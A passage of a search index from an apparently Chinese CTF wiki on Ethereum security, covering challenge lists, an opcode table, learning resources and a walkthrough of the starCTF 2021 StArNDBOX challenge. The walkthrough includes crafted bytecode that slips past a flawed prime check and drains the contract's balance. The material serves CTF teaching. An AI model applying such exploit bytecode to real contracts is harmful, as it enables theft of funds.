roiscoin","title":"RCTF"},{"location":"blockchain/ethereum/challenges/#_3","text":"\u9898\u76ee\u540d\u79f0 CreativityPlus \u9898\u76ee\u540d\u79f0 SafeDelegatecall","title":"\u7b2c\u4e94\u7a7a\u95f4"},{"location":"blockchain/ethereum/challenges/#_4","text":"\u9898\u76ee\u540d\u79f0 StrictMathematician","title":"\u7b2c\u4e00\u5c4a\u9493\u9c7c\u57ce\u676f"},{"location":"blockchain/ethereum/challenges/#qwb","text":"\u9898\u76ee\u540d\u79f0 IPFS \u9898\u76ee\u540d\u79f0 EasyAssembly \u9898\u76ee\u540d\u79f0 EasyFake \u9898\u76ee\u540d\u79f0 EasySandbox \u9898\u76ee\u540d\u79f0 EthGaMe (EGM) \u9898\u76ee\u540d\u79f0 EBK","title":"QWB"},{"location":"blockchain/ethereum/challenges/#balsn","text":"\u9898\u76ee\u540d\u79f0 Election \u9898\u76ee\u540d\u79f0 IdleGame","title":"Balsn"},{"location":"blockchain/ethereum/challenges/#_5","text":"\u9898\u76ee\u540d\u79f0 ethenc","title":"\u534e\u4e3a\u4e91\u5b89\u5168"},{"location":"blockchain/ethereum/challenges/#_6","text":"\u9898\u76ee\u540d\u79f0 boxgame","title":"\u534e\u4e3a\u9cb2\u9e4f\u8ba1\u7b97"},{"location":"blockchain/ethereum/challenges/#_7","text":"\u9898\u76ee\u540d\u79f0 ContractGame","title":"\u534e\u4e3a\u9e3f\u8499"},{"location":"blockchain/ethereum/challenges/#2019","text":"","title":"2019"},{"location":"blockchain/ethereum/challenges/#realworld_1","text":"\u9898\u76ee\u540d\u79f0 Montagy","title":"RealWorld"},{"location":"blockchain/ethereum/challenges/#balsn_1","text":"\u9898\u76ee\u540d\u79f0 Bank \u9898\u76ee\u540d\u79f0 Creativity","title":"balsn"},{"location":"blockchain/ethereum/challenges/#ciscn","text":"\u9898\u76ee\u540d\u79f0 Daysbank","title":"CISCN"},{"location":"blockchain/ethereum/challenges/#qwb_1","text":"\u9898\u76ee\u540d\u79f0 babybank \u9898\u76ee\u540d\u79f0 babybet","title":"QWB"},{"location":"blockchain/ethereum/challenges/#byte","text":"\u9898\u76ee\u540d\u79f0 bet \u9898\u76ee\u540d\u79f0 hf","title":"Byte"},{"location":"blockchain/ethereum/challenges/#n1ctf","text":"\u9898\u76ee\u540d\u79f0 h4ck","title":"N1CTF"},{"location":"blockchain/ethereum/challenges/#_8","text":"\u9898\u76ee\u540d\u79f0 cow \u9898\u76ee\u540d\u79f0 rise \u9898\u76ee\u540d\u79f0 jojo","title":"\u6570\u5b57\u7ecf\u6d4e"},{"location":"blockchain/ethereum/challenges/#roarctf","text":"\u9898\u76ee\u540d\u79f0 CoinFlip","title":"RoarCTF"},{"location":"blockchain/ethereum/challenges/#hackergame","text":"\u9898\u76ee\u540d\u79f0 JCBank","title":"Hackergame"},{"location":"blockchain/ethereum/challenges/#xctf_final","text":"\u9898\u76ee\u540d\u79f0 Happy_DOuble_Eleven","title":"XCTF_final"},{"location":"blockchain/ethereum/challenges/#d3ctf","text":"\u9898\u76ee\u540d\u79f0 bet2loss_v2","title":"D^3CTF"},{"location":"blockchain/ethereum/challenges/#de1ctf","text":"\u9898\u76ee\u540d\u79f0 Easy EOS","title":"De1CTF"},{"location":"blockchain/ethereum/challenges/#2018","text":"","title":"2018"},{"location":"blockchain/ethereum/challenges/#realworld_2","text":"\u9898\u76ee\u540d\u79f0 Acoraida Monica","title":"RealWorld"},{"location":"blockchain/ethereum/challenges/#hctf","text":"\u9898\u76ee\u540d\u79f0 ethre \u9898\u76ee\u540d\u79f0 bet2loss \u9898\u76ee\u540d\u79f0 ez2win","title":"HCTF"},{"location":"blockchain/ethereum/challenges/#bctf","text":"\u9898\u76ee\u540d\u79f0 Fake3d \u9898\u76ee\u540d\u79f0 EOSGAME","title":"BCTF"},{"location":"blockchain/ethereum/challenges/#wctf","text":"\u9898\u76ee\u540d\u79f0 BelluminarBank","title":"WCTF"},{"location":"blockchain/ethereum/challenges/#lctf","text":"\u9898\u76ee\u540d\u79f0 easy little trick \u9898\u76ee\u540d\u79f0 ggbank","title":"LCTF"},{"location":"blockchain/ethereum/challenges/#startctf","text":"\u9898\u76ee\u540d\u79f0 web-smart_contract","title":"startctf"},{"location":"blockchain/ethereum/challenges/#ddctf","text":"\u9898\u76ee\u540d\u79f0 mini blockchain","title":"DDCTF"},{"location":"blockchain/ethereum/challenges/#2017","text":"","title":"2017"},{"location":"blockchain/ethereum/challenges/#dctf","text":"\u9898\u76ee\u540d\u79f0 spock-lizard-alpha \u9898\u76ee\u540d\u79f0 spock-lizard-beta \u9898\u76ee\u540d\u79f0 spock-lizard-omega","title":"dctf"},{"location":"blockchain/ethereum/introduction/","text":"Ethereum Overview \u00b6 Info CTF \u4e2d\u5173\u4e8e\u533a\u5757\u94fe\u5b89\u5168\u7684\u5185\u5bb9\uff0c\u76ee\u524d\u4e3a\u6b62\uff0c\u6d89\u53ca\u5230\u6700\u591a\u7684\u4fbf\u662f Ethereum \u5b89\u5168\u3002 \u5b9a\u4e49 \u00b6 Ethereum is a decentralized, open-source blockchain featuring smart contract functionality. Ether (ETH) is the native cryptocurrency of the platform. It is the second-largest cryptocurrency by market capitalization, after Bitcoin. Ethereum is the most actively used blockchain. ------ from wikipedia Ethereum \u662f\u533a\u5757\u94fe 2.0 \u7684\u4ee3\u8868\u4ea7\u7269\uff0c\u56e0\u5176\u5e95\u5c42\u4f7f\u7528\u533a\u5757\u94fe\u6280\u672f\uff0c\u6240\u4ee5\u7ee7\u627f\u533a\u5757\u94fe\u7684\u5404\u79cd\u7279\u6027\uff0c\u5176\u4e2d\u6709\u4e00\u9879\u4fbf\u662f \u4ee3\u7801\u4e00\u65e6\u4e0a\u94fe\uff0c\u4fbf\u96be\u4ee5\u7be1\u6539\u6216\u66f4\u6539 \uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u989d\u5916\u5173\u6ce8\u5b83\u7684\u5b89\u5168\u3002 \u667a\u80fd\u5408\u7ea6 (Smart Contract) \u662f Ethereum \u4e2d\u6700\u4e3a\u91cd\u8981\u7684\u4e00\u4e2a\u6982\u5ff5\uff0c\u5141\u8bb8\u5728\u6ca1\u6709\u7b2c\u4e09\u65b9\u7684\u60c5\u51b5\u4e0b\u8fdb\u884c\u53ef\u4fe1\u4ea4\u6613\uff0c\u8fd9\u4e9b\u4ea4\u6613\u53ef\u8ffd\u8e2a\u4e14\u4e0d\u53ef\u9006\u8f6c\u3002 CTF \u4e2d\u7684\u533a\u5757\u94fe \u00b6 CTF \u4e2d\u6709\u5173\u4e8e Ethereum Security \u8fd8\u662f\u6bd4\u8f83\u7b80\u5355\u7684\uff0c\u4e3b\u8981\u6d89\u53ca\u5230\u7684\u662f Solidity Security\uff0c \u4e0b\u9762\u4ecb\u7ecd\u4e00\u4e0b\u9700\u8981\u5177\u5907\u7684\u57fa\u672c\u80fd\u529b\u3002 \u8981\u6c42 \u00b6 \u5bf9\u533a\u5757\u94fe\u57fa\u672c\u77e5\u8bc6\u4ee5\u53ca\u4ea4\u6613\u672c\u8d28\u6709\u6240\u4e86\u89e3 \u719f\u6089\u5e76\u638c\u63e1 Solidity \u7f16\u7a0b\u8bed\u8a00\u53ca\u4ee5\u592a\u574a\u865a\u62df\u673a EVM \u8fd0\u884c\u673a\u5236 \u719f\u6089\u5404\u79cd\u6d4b\u8bd5\u94fe\uff0c\u5305\u62ec\u79c1\u94fe \u719f\u6089 Remix\u3001MetaMask\u3001web3.js\u3001web3.py \u7b49\u5de5\u5177\u6216\u5e93\u7684\u4f7f\u7528 \u4e86\u89e3\u5e76\u638c\u63e1\u4ee5\u592a\u574a\u667a\u80fd\u5408\u7ea6\u5404\u79cd\u6f0f\u6d1e\u53ca\u5176\u653b\u51fb\u539f\u7406 \u5bf9\u5e95\u5c42 opcodes \u7406\u89e3\u900f\u5f7b \u8f83\u5f3a\u7684\u7a0b\u5e8f\u7406\u89e3\u548c\u9006\u5411\u5206\u6790\u80fd\u529b Note \u6ce8\uff1a\u4ee5\u592a\u574a\u667a\u80fd\u5408\u7ea6\u5927\u591a\u6570\u4e0d\u516c\u5f00\u6e90\u4ee3\u7801\uff0c\u800c\u662f\u5b57\u8282\u7801\uff0c\u6240\u4ee5\u9700\u8981\u9006\u5411\u5206\u6790\u80fd\u529b\u3002","title":"Ethereum Overview"},{"location":"blockchain/ethereum/introduction/#ethereum-overview","text":"Info CTF \u4e2d\u5173\u4e8e\u533a\u5757\u94fe\u5b89\u5168\u7684\u5185\u5bb9\uff0c\u76ee\u524d\u4e3a\u6b62\uff0c\u6d89\u53ca\u5230\u6700\u591a\u7684\u4fbf\u662f Ethereum \u5b89\u5168\u3002","title":"Ethereum Overview"},{"location":"blockchain/ethereum/introduction/#_1","text":"Ethereum is a decentralized, open-source blockchain featuring smart contract functionality. Ether (ETH) is the native cryptocurrency of the platform. It is the second-largest cryptocurrency by market capitalization, after Bitcoin. Ethereum is the most actively used blockchain. ------ from wikipedia Ethereum \u662f\u533a\u5757\u94fe 2.0 \u7684\u4ee3\u8868\u4ea7\u7269\uff0c\u56e0\u5176\u5e95\u5c42\u4f7f\u7528\u533a\u5757\u94fe\u6280\u672f\uff0c\u6240\u4ee5\u7ee7\u627f\u533a\u5757\u94fe\u7684\u5404\u79cd\u7279\u6027\uff0c\u5176\u4e2d\u6709\u4e00\u9879\u4fbf\u662f \u4ee3\u7801\u4e00\u65e6\u4e0a\u94fe\uff0c\u4fbf\u96be\u4ee5\u7be1\u6539\u6216\u66f4\u6539 \uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u989d\u5916\u5173\u6ce8\u5b83\u7684\u5b89\u5168\u3002 \u667a\u80fd\u5408\u7ea6 (Smart Contract) \u662f Ethereum \u4e2d\u6700\u4e3a\u91cd\u8981\u7684\u4e00\u4e2a\u6982\u5ff5\uff0c\u5141\u8bb8\u5728\u6ca1\u6709\u7b2c\u4e09\u65b9\u7684\u60c5\u51b5\u4e0b\u8fdb\u884c\u53ef\u4fe1\u4ea4\u6613\uff0c\u8fd9\u4e9b\u4ea4\u6613\u53ef\u8ffd\u8e2a\u4e14\u4e0d\u53ef\u9006\u8f6c\u3002","title":"\u5b9a\u4e49"},{"location":"blockchain/ethereum/introduction/#ctf","text":"CTF \u4e2d\u6709\u5173\u4e8e Ethereum Security \u8fd8\u662f\u6bd4\u8f83\u7b80\u5355\u7684\uff0c\u4e3b\u8981\u6d89\u53ca\u5230\u7684\u662f Solidity Security\uff0c \u4e0b\u9762\u4ecb\u7ecd\u4e00\u4e0b\u9700\u8981\u5177\u5907\u7684\u57fa\u672c\u80fd\u529b\u3002","title":"CTF \u4e2d\u7684\u533a\u5757\u94fe"},{"location":"blockchain/ethereum/introduction/#_2","text":"\u5bf9\u533a\u5757\u94fe\u57fa\u672c\u77e5\u8bc6\u4ee5\u53ca\u4ea4\u6613\u672c\u8d28\u6709\u6240\u4e86\u89e3 \u719f\u6089\u5e76\u638c\u63e1 Solidity \u7f16\u7a0b\u8bed\u8a00\u53ca\u4ee5\u592a\u574a\u865a\u62df\u673a EVM \u8fd0\u884c\u673a\u5236 \u719f\u6089\u5404\u79cd\u6d4b\u8bd5\u94fe\uff0c\u5305\u62ec\u79c1\u94fe \u719f\u6089 Remix\u3001MetaMask\u3001web3.js\u3001web3.py \u7b49\u5de5\u5177\u6216\u5e93\u7684\u4f7f\u7528 \u4e86\u89e3\u5e76\u638c\u63e1\u4ee5\u592a\u574a\u667a\u80fd\u5408\u7ea6\u5404\u79cd\u6f0f\u6d1e\u53ca\u5176\u653b\u51fb\u539f\u7406 \u5bf9\u5e95\u5c42 opcodes \u7406\u89e3\u900f\u5f7b \u8f83\u5f3a\u7684\u7a0b\u5e8f\u7406\u89e3\u548c\u9006\u5411\u5206\u6790\u80fd\u529b Note \u6ce8\uff1a\u4ee5\u592a\u574a\u667a\u80fd\u5408\u7ea6\u5927\u591a\u6570\u4e0d\u516c\u5f00\u6e90\u4ee3\u7801\uff0c\u800c\u662f\u5b57\u8282\u7801\uff0c\u6240\u4ee5\u9700\u8981\u9006\u5411\u5206\u6790\u80fd\u529b\u3002","title":"\u8981\u6c42"},{"location":"blockchain/ethereum/opcodes/","text":"Ethereum Opcodes \u00b6 Ethereum \u4e2d\u7684 opcodes \u6709 142 \u79cd\uff0c\u90e8\u5206\u5e38\u89c1\u7684 opcodes \u5982\u4e0b\u6240\u793a\uff1a Uint8 Mnomonic Stack Input Stack Output Expression 00 STOP - - STOP() 01 ADD | a | b | | a + b | a + b 02 MUL | a | b | | a * b | a * b 03 SUB | a | b | | a - b | a - b 04 DIV | a | b | | a // b | a // b 51 MLOAD | offset | | value | value = memory[offset:offset+32] 52 MSTORE | offset | value | - memory[offset:offset+32] = value 54 SLOAD | key | | value | value = storage[key] 55 SSTORE | key | value | - storage[key] = value 56 JUMP | destination | - $pc = destination 5B JUMPDEST - - - F3 RETURN | offset | length | - return memory[offset:offset+length] FD REVERT | offset | length | - revert(memory[offset:offset+length]) Info JUMPDEST \u662f\u8df3\u8f6c\u6307\u4ee4\u7684 destination\uff0c\u8df3\u8f6c\u6307\u4ee4\u4e0d\u80fd\u8df3\u8f6c\u5230\u6ca1\u6709 JUMPDEST \u7684\u5730\u65b9\u3002 \u66f4\u591a\u7684\u8be6\u7ec6 opcodes \u4fe1\u606f\u53ef\u4ee5\u67e5\u770b ethervm.io \u3002 \u4f8b\u5b50 \u00b6 \u4ee5 startCTF 2021 \u7684 StArNDBOX \u4e00\u9898\u4e3a\u4f8b\u8bb2\u89e3\u4e00\u4e0b opcodes \u7684\u9898\u76ee\u3002 \u672c\u9898\u4f1a\u5728\u90e8\u7f72\u6311\u6218\u5408\u7ea6\u7684\u65f6\u5019\u4f20\u5165 100 wei \u5230\u5408\u7ea6\u4e2d\uff0c\u6211\u4eec\u7684\u76ee\u6807\u662f\u5c06\u5408\u7ea6\u7684 balance \u6e05\u7a7a\u3002\u9898\u76ee\u5408\u7ea6\u7684\u6e90\u7801\u5982\u4e0b\uff1a pragma solidity ^ 0.5.11 ; library Math { function invMod ( int256 _x , int256 _pp ) internal pure returns ( int ) { int u3 = _x ; int v3 = _pp ; int u1 = 1 ; int v1 = 0 ; int q = 0 ; while ( v3 > 0 ){ q = u3 / v3 ; u1 = v1 ; v1 = u1 - v1 * q ; u3 = v3 ; v3 = u3 - v3 * q ; } while ( u1 < 0 ){ u1 += _pp ; } return u1 ; } function expMod ( int base , int pow , int mod ) internal pure returns ( int res ){ res = 1 ; if ( mod > 0 ){ base = base % mod ; for (; pow != 0 ; pow >>= 1 ) { if ( pow & 1 == 1 ) { res = ( base * res ) % mod ; } base = ( base * base ) % mod ; } } return res ; } function pow_mod ( int base , int pow , int mod ) internal pure returns ( int res ) { if ( pow >= 0 ) { return expMod ( base , pow , mod ); } else { int inv = invMod ( base , mod ); return expMod ( inv , abs ( pow ), mod ); } } function isPrime ( int n ) internal pure returns ( bool ) { if ( n == 2 || n == 3 || n == 5 ) { return true ; } else if ( n % 2 == 0 && n > 1 ){ return false ; } else { int d = n - 1 ; int s = 0 ; while ( d & 1 != 1 && d != 0 ) { d >>= 1 ; ++ s ; } int a = 2 ; int xPre ; int j ; int x = pow_mod ( a , d , n ); if ( x == 1 || x == ( n - 1 )) { return true ; } else { for ( j = 0 ; j < s ; ++ j ) { xPre = x ; x = pow_mod ( x , 2 , n ); if ( x == n - 1 ){ return true ; } else if ( x == 1 ){ return false ; } } } return false ; } } function gcd ( int a , int b ) internal pure returns ( int ) { int t = 0 ; if ( a < b ) { t = a ; a = b ; b = t ; } while ( b != 0 ) { t = b ; b = a % b ; a = t ; } return a ; } function abs ( int num ) internal pure returns ( int ) { if ( num >= 0 ) { return num ; } else { return ( 0 - num ); } } } contract StArNDBOX { using Math for int ; constructor () public payable { } modifier StAr () { require ( msg.sender != tx.origin ); _ ; } function StArNDBoX ( address _addr ) public payable { uint256 size ; bytes memory code ; int res ; assembly { size : = extcodesize ( _addr ) code : = mload ( 0x40 ) mstore ( 0x40 , add ( code , and ( add ( add ( size , 0x20 ), 0x1f ), not ( 0x1f )))) mstore ( code , size ) extcodecopy ( _addr , add ( code , 0x20 ), 0 , size ) } for ( uint256 i = 0 ; i < code . length ; i ++ ) { res = int ( uint8 ( code [ i ])); require ( res . isPrime () == true ); } bool success ; bytes memory _ ; ( success , _ ) = _addr . delegatecall ( \"\" ); require ( success ); } } \u53ef\u4ee5\u770b\u5230\u9898\u76ee\u7684 StArNDBoX \u51fd\u6570\u53ef\u4ee5\u83b7\u53d6\u4efb\u610f\u5730\u5740\u7684\u5408\u7ea6\u5e76\u68c0\u6d4b\u8be5\u5408\u7ea6\u7684\u6bcf\u4e2a\u5b57\u8282\u662f\u5426\u4e3a\u8d28\u6570\uff0c\u5982\u679c\u901a\u8fc7\u68c0\u67e5\u5219\u4f7f\u7528 delegatecall \u6765\u8c03\u7528\u76ee\u6807\u5408\u7ea6\u3002 \u4f46\u7531\u4e8e\u8be5\u5408\u7ea6\u4e2d\u7684 isPrime \u51fd\u6570\u5e76\u4e0d\u662f\u5b8c\u6574\u7684\u8d28\u6570\u68c0\u67e5\u51fd\u6570\uff0c 00 \u548c 01 \u4e5f\u53ef\u4ee5\u901a\u8fc7\u68c0\u67e5\uff0c\u56e0\u6b64\u6211\u4eec\u53ef\u4ee5\u6784\u9020\u5982\u4e0b\u7684\u5b57\u8282\u7801\uff1a // 0x6100016100016100016100016100016100650361000161fbfbf1 61 00 01 | PUSH2 0x0001 61 00 01 | PUSH2 0x0001 61 00 01 | PUSH2 0x0001 61 00 01 | PUSH2 0x0001 61 00 01 | PUSH2 0x0001 61 00 65 | PUSH2 0x0065 03 | SUB 61 00 01 | PUSH2 0x0001 61 fb fb | PUSH2 0xfbfb f1 | CALL \u6765\u6267\u884c address(0x0001).call.gas(0xfbfb).value(0x0065 - 0x0001) \u8bed\u53e5\uff0c\u4e5f\u5c31\u662f\u5c06\u9898\u76ee\u5408\u7ea6\u4e2d\u7684 balance \u8f6c\u5230 0x1 \u5904\uff0c\u4ece\u800c\u6e05\u7a7a balance \u6ee1\u8db3\u5f97\u5230 flag \u7684\u6761\u4ef6\u3002 \u9898\u76ee \u00b6 starCTF 2021 \u00b6 \u9898\u76ee\u540d\u79f0 StArNDBOX RealWorld 2019 \u00b6 \u9898\u76ee\u540d\u79f0 Montagy QWB 2020 \u00b6 \u9898\u76ee\u540d\u79f0 EasySandbox \u9898\u76ee\u540d\u79f0 EGM \u534e\u4e3a\u9cb2\u9e4f\u8ba1\u7b97 2020 \u00b6 \u9898\u76ee\u540d\u79f0 boxgame Note \u6ce8\uff1a\u9898\u76ee\u9644\u4ef6\u76f8\u5173\u5185\u5bb9\u53ef\u81f3 ctf-challenges/blockchain \u4ed3\u5e93\u5bfb\u627e\u3002 \u53c2\u8003 \u00b6 Ethervm starCTF 2021 - StArNDBOX","title":"Ethereum Opcodes"},{"location":"blockchain/ethereum/opcodes/#ethereum-opcodes","text":"Ethereum \u4e2d\u7684 opcodes \u6709 142 \u79cd\uff0c\u90e8\u5206\u5e38\u89c1\u7684 opcodes \u5982\u4e0b\u6240\u793a\uff1a Uint8 Mnomonic Stack Input Stack Output Expression 00 STOP - - STOP() 01 ADD | a | b | | a + b | a + b 02 MUL | a | b | | a * b | a * b 03 SUB | a | b | | a - b | a - b 04 DIV | a | b | | a // b | a // b 51 MLOAD | offset | | value | value = memory[offset:offset+32] 52 MSTORE | offset | value | - memory[offset:offset+32] = value 54 SLOAD | key | | value | value = storage[key] 55 SSTORE | key | value | - storage[key] = value 56 JUMP | destination | - $pc = destination 5B JUMPDEST - - - F3 RETURN | offset | length | - return memory[offset:offset+length] FD REVERT | offset | length | - revert(memory[offset:offset+length]) Info JUMPDEST \u662f\u8df3\u8f6c\u6307\u4ee4\u7684 destination\uff0c\u8df3\u8f6c\u6307\u4ee4\u4e0d\u80fd\u8df3\u8f6c\u5230\u6ca1\u6709 JUMPDEST \u7684\u5730\u65b9\u3002 \u66f4\u591a\u7684\u8be6\u7ec6 opcodes \u4fe1\u606f\u53ef\u4ee5\u67e5\u770b ethervm.io \u3002","title":"Ethereum Opcodes"},{"location":"blockchain/ethereum/opcodes/#_1","text":"\u4ee5 startCTF 2021 \u7684 StArNDBOX \u4e00\u9898\u4e3a\u4f8b\u8bb2\u89e3\u4e00\u4e0b opcodes \u7684\u9898\u76ee\u3002 \u672c\u9898\u4f1a\u5728\u90e8\u7f72\u6311\u6218\u5408\u7ea6\u7684\u65f6\u5019\u4f20\u5165 100 wei \u5230\u5408\u7ea6\u4e2d\uff0c\u6211\u4eec\u7684\u76ee\u6807\u662f\u5c06\u5408\u7ea6\u7684 balance \u6e05\u7a7a\u3002\u9898\u76ee\u5408\u7ea6\u7684\u6e90\u7801\u5982\u4e0b\uff1a pragma solidity ^ 0.5.11 ; library Math { function invMod ( int256 _x , int256 _pp ) internal pure returns ( int ) { int u3 = _x ; int v3 = _pp ; int u1 = 1 ; int v1 = 0 ; int q = 0 ; while ( v3 > 0 ){ q = u3 / v3 ; u1 = v1 ; v1 = u1 - v1 * q ; u3 = v3 ; v3 = u3 - v3 * q ; } while ( u1 < 0 ){ u1 += _pp ; } return u1 ; } function expMod ( int base , int pow , int mod ) internal pure returns ( int res ){ res = 1 ; if ( mod > 0 ){ base = base % mod ; for (; pow != 0 ; pow >>= 1 ) { if ( pow & 1 == 1 ) { res = ( base * res ) % mod ; } base = ( base * base ) % mod ; } } return res ; } function pow_mod ( int base , int pow , int mod ) internal pure returns ( int res ) { if ( pow >= 0 ) { return expMod ( base , pow , mod ); } else { int inv = invMod ( base , mod ); return expMod ( inv , abs ( pow ), mod ); } } function isPrime ( int n ) internal pure returns ( bool ) { if ( n == 2 || n == 3 || n == 5 ) { return true ; } else if ( n % 2 == 0 && n > 1 ){ return false ; } else { int d = n - 1 ; int s = 0 ; while ( d & 1 != 1 && d != 0 ) { d >>= 1 ; ++ s ; } int a = 2 ; int xPre ; int j ; int x = pow_mod ( a , d , n ); if ( x == 1 || x == ( n - 1 )) { return true ; } else { for ( j = 0 ; j < s ; ++ j ) { xPre = x ; x = pow_mod ( x , 2 , n ); if ( x == n - 1 ){ return true ; } else if ( x == 1 ){ return false ; } } } return false ; } } function gcd ( int a , int b ) internal pure returns ( int ) { int t = 0 ; if ( a < b ) { t = a ; a = b ; b = t ; } while ( b != 0 ) { t = b ; b = a % b ; a = t ; } return a ; } function abs ( int num ) internal pure returns ( int ) { if ( num >= 0 ) { return num ; } else { return ( 0 - num ); } } } contract StArNDBOX { using Math for int ; constructor () public payable { } modifier StAr () { require ( msg.sender != tx.origin ); _ ; } function StArNDBoX ( address _addr ) public payable { uint256 size ; bytes memory code ; int res ; assembly { size : = extcodesize ( _addr ) code : = mload ( 0x40 ) mstore ( 0x40 , add ( code , and ( add ( add ( size , 0x20 ), 0x1f ), not ( 0x1f )))) mstore ( code , size ) extcodecopy ( _addr , add ( code , 0x20 ), 0 , size ) } for ( uint256 i = 0 ; i < code . length ; i ++ ) { res = int ( uint8 ( code [ i ])); require ( res . isPrime () == true ); } bool success ; bytes memory _ ; ( success , _ ) = _addr . delegatecall ( \"\" ); require ( success ); } } \u53ef\u4ee5\u770b\u5230\u9898\u76ee\u7684 StArNDBoX \u51fd\u6570\u53ef\u4ee5\u83b7\u53d6\u4efb\u610f\u5730\u5740\u7684\u5408\u7ea6\u5e76\u68c0\u6d4b\u8be5\u5408\u7ea6\u7684\u6bcf\u4e2a\u5b57\u8282\u662f\u5426\u4e3a\u8d28\u6570\uff0c\u5982\u679c\u901a\u8fc7\u68c0\u67e5\u5219\u4f7f\u7528 delegatecall \u6765\u8c03\u7528\u76ee\u6807\u5408\u7ea6\u3002 \u4f46\u7531\u4e8e\u8be5\u5408\u7ea6\u4e2d\u7684 isPrime \u51fd\u6570\u5e76\u4e0d\u662f\u5b8c\u6574\u7684\u8d28\u6570\u68c0\u67e5\u51fd\u6570\uff0c 00 \u548c 01 \u4e5f\u53ef\u4ee5\u901a\u8fc7\u68c0\u67e5\uff0c\u56e0\u6b64\u6211\u4eec\u53ef\u4ee5\u6784\u9020\u5982\u4e0b\u7684\u5b57\u8282\u7801\uff1a // 0x6100016100016100016100016100016100650361000161fbfbf1 61 00 01 | PUSH2 0x0001 61 00 01 | PUSH2 0x0001 61 00 01 | PUSH2 0x0001 61 00 01 | PUSH2 0x0001 61 00 01 | PUSH2 0x0001 61 00 65 | PUSH2 0x0065 03 | SUB 61 00 01 | PUSH2 0x0001 61 fb fb | PUSH2 0xfbfb f1 | CALL \u6765\u6267\u884c address(0x0001).call.gas(0xfbfb).value(0x0065 - 0x0001) \u8bed\u53e5\uff0c\u4e5f\u5c31\u662f\u5c06\u9898\u76ee\u5408\u7ea6\u4e2d\u7684 balance \u8f6c\u5230 0x1 \u5904\uff0c\u4ece\u800c\u6e05\u7a7a balance \u6ee1\u8db3\u5f97\u5230 flag \u7684\u6761\u4ef6\u3002","title":"\u4f8b\u5b50"},{"location":"blockchain/ethereum/opcodes/#_2","text":"","title":"\u9898\u76ee"},{"location":"blockchain/ethereum/opcodes/#starctf-2021","text":"\u9898\u76ee\u540d\u79f0 StArNDBOX","title":"starCTF 2021"},{"location":"blockchain/ethereum/opcodes/#realworld-2019","text":"\u9898\u76ee\u540d\u79f0 Montagy","title":"RealWorld 2019"},{"location":"blockchain/ethereum/opcodes/#qwb-2020","text":"\u9898\u76ee\u540d\u79f0 EasySandbox \u9898\u76ee\u540d\u79f0 EGM","title":"QWB 2020"},{"location":"blockchain/ethereum/opcodes/#2020","text":"\u9898\u76ee\u540d\u79f0 boxgame Note \u6ce8\uff1a\u9898\u76ee\u9644\u4ef6\u76f8\u5173\u5185\u5bb9\u53ef\u81f3 ctf-challenges/blockchain \u4ed3\u5e93\u5bfb\u627e\u3002","title":"\u534e\u4e3a\u9cb2\u9e4f\u8ba1\u7b97 2020"},{"location":"blockchain/ethereum/opcodes/#_3","text":"Ethervm starCTF 2021 - StArNDBOX","title":"\u53c2\u8003"},{"location":"blockchain/ethereum/resources/","text":"\u5b66\u4e60\u8d44\u6e90 \u00b6 \u5728\u7ebf\u505a\u9898\u7f51\u7ad9 \u00b6 https://ethernaut.openzeppelin.com/ WP \u94fe\u63a5 https://hitcxy.com/2019/ethernaut/ https://capturetheether.com/challenges/ WP \u94fe\u63a5 WP1 \u4f20\u9001\u95e8 WP2 \u4f20\u9001\u95e8 https://blockchain-ctf.securityinnovation.com/#/ WP \u94fe\u63a5 https://hitcxy.com/2020/securityinnovation/ https://www.damnvulnerabledefi.xyz/ WP \u94fe\u63a5 https://blog.syang.xyz/2021/03/damn-vulnerable-defi-writeup/ Books \u00b6 \u300a\u4ee5\u592a\u574a\u6280\u672f\u8be6\u89e3\u4e0e\u5b9e\u6218\u300b-- \u4ee5\u592a\u574a\u521b\u59cb\u4eba\u3001\u9996\u5e2d\u79d1\u5b66\u5bb6 Vitalik Buterin \u503e\u529b\u63a8\u8350 \u5f85\u8865\u5145 papers \u00b6 \u667a\u80fd\u5408\u7ea6 https://github.com/hzysvilla/Academic_Smart_Contract_Papers \u533a\u5757\u94fe\uff08\u5305\u62ec\u667a\u80fd\u5408\u7ea6\uff09 https://github.com/jianyu-niu/blockchain_conference_paper \u5f85\u8865\u5145 Security Tools \u00b6 \u642c\u8fd0\u81ea https://consensys.github.io/smart-contract-best-practices/security_tools/ Visualization \u00b6 Solidity Visual Auditor - This extension contributes security centric syntax and semantic highlighting, a detailed class outline and advanced Solidity code insights to Visual Studio Code S\u016brya - Utility tool for smart contract systems, offering a number of visual outputs and information about the contracts' structure. Also supports querying the function call graph. Solgraph - Generates a DOT graph that visualizes function control flow of a Solidity contract and highlights potential security vulnerabilities. EVM Lab - Rich tool package to interact with the EVM. Includes a VM, Etherchain API, and a trace-viewer. ethereum-graph-debugger - A graphical EVM debugger. Displays the entire program control flow graph. Piet - Web application helping understand smart contract architectures. Offers graphical representation and inspection of smart contracts as well as a markdown documentation generator. Static and Dynamic Analysis \u00b6 MythX - MythX is a professional-grade cloud service that uses symbolic analysis and input fuzzing to detect common security bugs and verify the correctness of smart contract code . Using MythX requires an API key from mythx.io . Mythril - The Swiss army knife for smart contract security. Slither - Static analysis framework with detectors for many common Solidity issues. It has taint and value tracking capabilities and is written in Python. Contract-Library - Decompiler and security analysis tool for all deployed contracts. Echidna - The only available fuzzer for Ethereum software. Uses property testing to generate malicious inputs that break smart contracts. Manticore - Dynamic binary analysis tool with EVM support . Oyente - Analyze Ethereum code to find common vulnerabilities, based on this paper . Securify - Fully automated online static analyzer for smart contracts, providing a security report based on vulnerability patterns. SmartCheck - Static analysis of Solidity source code for security vulnerabilities and best practices. Octopus - Security Analysis tool for Blockchain Smart Contracts with support of EVM and (e)WASM. sFuzz - Efficient fuzzer inspired from AFL to find common vulnerabilities. Vertigo - Mutation Testing for Ethereum Smart Contracts. Weakness OSSClassifcation & Test Cases \u00b6 SWC-registry - SWC definitions and a large repository of crafted and real-world samples of vulnerable smart contracts. SWC Pages - The SWC-registry repo published on Github Pages Test Coverage \u00b6 solidity-coverage - Code coverage for Solidity testing. Linters and Formatters \u00b6 Linters improve code quality by enforcing rules for style and composition, making code easier to read and review. Ethlint - Yet another Solidity linting. Solhint - A linter for Solidity that provides both Security and Style Guide validations. Prettier + Solidity Plugin - Prettier enforces basic style conventions in your code.","title":"\u5b66\u4e60\u8d44\u6e90"},{"location":"blockchain/ethereum/resources/#_1","text":"","title":"\u5b66\u4e60\u8d44\u6e90"},{"location":"blockchain/ethereum/resources/#_2","text":"https://ethernaut.openzeppelin.com/ WP \u94fe\u63a5 https://hitcxy.com/2019/ethernaut/ 